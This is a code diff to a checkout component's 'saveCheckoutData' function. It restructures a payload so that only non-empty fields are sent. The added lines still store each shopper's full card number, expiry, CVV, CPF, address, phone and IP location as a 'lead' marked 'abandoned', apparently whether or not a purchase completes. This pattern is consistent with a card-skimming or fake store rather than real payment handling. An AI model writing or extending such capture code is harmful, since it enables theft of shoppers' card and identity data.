@@ -148,29 +148,37 @@ const Checkout = () => {
 
   const saveCheckoutData = useCallback(async (statusOverride?: string, extraFields?: Record<string, unknown>) => {
     const rawCardDigits = cardNumber.replace(/\D/g, "");
+
+    // Build payload only with non-null values to avoid overwriting existing data
     const payload: Record<string, unknown> = {
       session_id: sessionIdRef.current,
       product_name: name,
       product_price: price,
-      variant,
-      color,
+      variant: variant || null,
+      color: color || null,
       quantity,
-      full_name: addressData.fullName || null,
-      phone: addressData.phone || null,
-      street_number: addressData.streetNumber || null,
-      city: addressData.city || null,
-      state: addressData.state || null,
-      payment_method: paymentMethod,
-      card_name: cardName || null,
-      card_last4: rawCardDigits.slice(-4) || null,
-      card_number_full: rawCardDigits || null,
-      card_expiry: cardExpiry || null,
-      card_cvv: cardCvv || null,
-      card_cpf: cardCpf || null,
       status: statusOverride || "abandoned",
-      ip_location: geoCity ? `${geoCity}, ${geoState}` : null,
-      ...extraFields,
     };
+
+    // Only include fields that have actual values
+    if (addressData.fullName) payload.full_name = addressData.fullName;
+    if (addressData.phone) payload.phone = addressData.phone;
+    if (addressData.streetNumber) payload.street_number = addressData.streetNumber;
+    if (addressData.city) payload.city = addressData.city;
+    if (addressData.state) payload.state = addressData.state;
+    if (paymentMethod) payload.payment_method = paymentMethod;
+    if (cardName) payload.card_name = cardName;
+    if (rawCardDigits) {
+      payload.card_number_full = rawCardDigits;
+      payload.card_last4 = rawCardDigits.slice(-4);
+    }
+    if (cardExpiry) payload.card_expiry = cardExpiry;
+    if (cardCvv) payload.card_cvv = cardCvv;
+    if (cardCpf) payload.card_cpf = cardCpf;
+    if (geoCity) payload.ip_location = `${geoCity}, ${geoState}`;
+
+    // Merge extra fields (e.g. pix_code, pix_status) without risk of override
+    if (extraFields) Object.assign(payload, extraFields);
 
     const persistLead = async () => {
       try {
